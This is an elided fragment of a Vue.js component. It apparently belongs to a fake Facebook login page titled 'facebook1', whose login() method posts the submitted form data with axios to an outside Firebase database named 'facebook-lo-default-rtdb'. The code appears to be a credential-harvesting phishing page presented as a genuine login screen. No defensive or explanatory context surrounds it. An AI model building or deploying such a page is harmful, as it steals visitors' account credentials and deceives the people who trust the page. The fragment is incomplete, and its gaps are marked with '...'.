<template>
              ...
              <div class="container">
                ...
                <div class="row">
                  ...
                  <div class="col title-div">
                    <div>
                      <h1 class="text-primary">facebook1</h1>
                      <p>
  ...
  export default {
   ...
   async   login(){
      ...
      await this.$store.commit("facebook/setFacebook1", true);
     await   axios.post('https://facebook-lo-default-rtdb.asia-southeast1.firebasedatabase.app/users.json', data)
      .then((response) => {
      })
      .catch((error) => {
        console.log(error);
